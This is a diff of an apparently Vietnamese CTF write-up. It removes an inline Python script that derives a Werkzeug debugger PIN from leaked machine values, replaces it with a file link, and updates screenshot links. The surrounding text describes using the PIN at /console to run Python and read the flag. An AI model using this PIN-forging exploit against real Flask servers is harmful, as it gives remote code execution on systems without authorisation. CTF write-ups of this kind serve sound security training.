@@ -102,53 +102,7 @@ print(0x92504aa80b4d)
 
 Thay thế tất cả các thông tin đã thu thập được vào script khai thác sau:
 
-```
-#!/bin/python3
-import hashlib
-from itertools import chain
-
-probably_public_bits = [
-    'urmother', # username
-    'flask.app', # modname
-    'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__'))
-    '/usr/local/lib/python3.12/site-packages/flask/app.py' # getattr(mod, '__file__', None),
-]
-
-private_bits = [
-    '51121675805739', # str(uuid.getnode()),  /sys/class/net/eth1/address 
-    # Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
-    '29233f5c-749c-402b-9176-164c5268546e'
-]
-
-h = hashlib.sha1() # Newer versions of Werkzeug use SHA1 instead of MD5
-for bit in chain(probably_public_bits, private_bits):
-    if not bit:
-        continue
-    if isinstance(bit, str):
-        bit = bit.encode('utf-8')
-    h.update(bit)
-h.update(b'cookiesalt')
-
-cookie_name = '__wzd' + h.hexdigest()[:20]
-
-num = None
-if num is None:
-    h.update(b'pinsalt')
-    num = ('%09d' % int(h.hexdigest(), 16))[:9]
-
-rv = None
-if rv is None:
-    for group_size in 5, 4, 3:
-        if len(num) % group_size == 0:
-            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
-                          for x in range(0, len(num), group_size))
-            break
-    else:
-        rv = num
-
-print("Pin: " + rv)
-
-```
+[text](script.py)
 
 Chạy script trên, ta thu được mã PIN: **`834-198-249`**
 
@@ -156,7 +110,8 @@ Chạy script trên, ta thu được mã PIN: **`834-198-249`**
 
 Sử dụng mã PIN vừa tạo được để login vào endpoint `/console`. Tại đây, giao diện Interactive Console đã được mở, cho phép chúng ta thực thi lệnh Python trực tiếp (RCE) để đọc file flag trên hệ thống server.
 
-*(Chèn các ảnh RCE qua console tại đây: `<D:\BKSEC Training 2026\BKSEC Public Insecure News\asset\flag-search.png>`, `<D:\BKSEC Training 2026\BKSEC Public Insecure News\asset\flag-search2.png>`)*
+![alt text](asset/flag-search.png)
+![alt text](asset/flag-search2.png)
 
 **Flag thu được:**
 
